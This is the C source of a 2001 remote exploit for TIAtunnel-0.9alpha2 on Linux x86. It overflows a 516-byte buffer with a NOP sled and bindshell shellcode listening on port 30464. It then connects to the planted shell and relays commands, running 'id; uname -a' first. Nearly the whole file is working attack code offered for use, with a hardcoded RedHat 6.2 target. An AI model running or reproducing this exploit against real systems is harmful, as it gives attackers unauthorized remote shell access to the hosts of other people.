/*  
 *  TIAtunnel-0.9alpha2 Linux x86 remote exploit
 *  by qitest1 - 5/06/2001
 *
 *  Shellcode is executed with the privileges of the program. I 
 *  noticed that with a simple execve() a shell was executed but its 
 *  IO was linked with the term where TIAtunnel was launched. This 
 *  is not a problem for us if we use a bindshell code.  
 *
 *  Greets: recidjvo->Tnx for this bug. And now you can really smile. 
 *	    Nail    ->Dear friend ;)		 
 *  Hmm.. 0x69 seems to strike again..
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>

#define RETPOS 		516		

struct targ
{
   int                  def;
   char                 *descr;
   unsigned long int    retaddr;
};

struct targ target[]=
    {                   
      {0, "RedHat 6.2 with TIAtunnel-0.9alpha2 from tar.gz", 0xbffff67c},
      {69, NULL, 0}
    };

char shellcode[] =		/* bindshell at port 30464 */
  "\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"
  "\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"
  "\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"
  "\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"
  "\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"
  "\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"
  "\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"
  "\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"
  "\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"
  "\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"
  "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
  "\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff";

char		mybuf[RETPOS + 4 + 1 + 1];

int             sockami(char *host, int port);
void		do_mybuf(unsigned long retaddr);
void		shellami(int sock);
void            usage(char *progname);

main(int argc, char **argv)
{
int 	i,
	sel = 0,
	port = 0,
	offset = 0,
	sock,
        cnt;
char 	*host = NULL;

  printf("\n  TIAtunnel-0.9alpha2 exploit by qitest1\n\n");
  
  if(argc == 1)
        usage(argv[0]);
  while((cnt = getopt(argc,argv,"h:p:t:o:")) != EOF)
    {
   switch(cnt)
        {
   case 'h':
     host = strdup(optarg);
     break;
   case 'p':
     port = atoi(optarg);
     break;
   case 't':
     sel = atoi(optarg);       
     break;
   case 'o':
     offset = atoi(optarg);
     break;
   default:
     usage(argv[0]);
     break;
        }
    }
  if(host == NULL)
        usage(argv[0]);
  if(port == 0)
	usage(argv[0]);

  printf("+Host: %s\n  as: %s\n", host, target[sel].descr);
  printf("+Connecting to %s...\n", host);
  sock = sockami(host, port);
  printf("  connected\n");

  target[0].retaddr += atoi(argv[1]);
  printf("+Building buffer with retaddr: %p...\n", target[0].retaddr);
  do_mybuf(target[0].retaddr);
  strcat(mybuf, "\n");
  printf("  done\n");
  send(sock, mybuf, strlen(mybuf), 0);
  printf("+Overflowing...\n");

  printf("+Zzing...\n");
  sleep(2);
  printf("+Getting shell...\n");
  sock = sockami(host, 30464);  
  shellami(sock);
}

int
sockami(char *host, int port)
{
struct sockaddr_in address;
struct hostent *hp;
int sock;

  sock = socket(AF_INET, SOCK_STREAM, 0);
  if(sock == -1)
	{
          perror("socket()");
          exit(-1);
        }
 
  hp = gethostbyname(host);
  if(hp == NULL)
        {
          perror("gethostbyname()");
          exit(-1);
        }

  memset(&address, 0, sizeof(address));
  memcpy((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons(port);

  if(connect(sock, (struct sockaddr *) &address, sizeof(address)) == -1)
        {
          perror("connect()");
          exit(-1);
        }

  return(sock);
}

void
do_mybuf(unsigned long int retaddr)
{
int		i,
		n = 0;
unsigned long 	*ret;

  memset(mybuf, 0x90, sizeof(mybuf));
  for(i = RETPOS - strlen(shellcode); i < RETPOS; i++)
	{
          mybuf[i] = shellcode[n++];
	}
  ret = (unsigned long *) (mybuf + RETPOS);
  *ret = retaddr;
  mybuf[RETPOS + 4] = '\x00';
}

void
shellami(int sock)
{
int             n;
char            recvbuf[1024];
char            *cmd = "id; uname -a\n";
fd_set          rset;

  send(sock, cmd, strlen(cmd), 0);

  while (1)
    {
      FD_ZERO(&rset);
      FD_SET(sock,&rset);
      FD_SET(STDIN_FILENO,&rset);
      select(sock+1,&rset,NULL,NULL,NULL);
      if (FD_ISSET(sock,&rset))
        {
          n=read(sock,recvbuf,1024);
          if (n <= 0)
            {
              printf("Connection closed by foreign host.\n");
              exit(0);
            }
          recvbuf[n]=0;
          printf("%s",recvbuf);
        }
      if (FD_ISSET(STDIN_FILENO,&rset))
        {
          n=read(STDIN_FILENO,recvbuf,1024);
          if (n>0)
            {
              recvbuf[n]=0;
              write(sock,recvbuf,n);
            }
        }
    }
  return;
}

void
usage(char *progname)
{
int             i = 0;
  
  printf("Usage: %s [options]\n", progname);
  printf("Options:\n"
         "  -h hostname\n"
	 "  -p port\n"
         "  -t target\n"
         "  -o offset\n"
         "Available targets:\n");
  while(target[i].def != 69)
        { 
          printf("  %d) %s\n", target[i].def, target[i].descr);
          i++;
        } 

  exit(1);
}
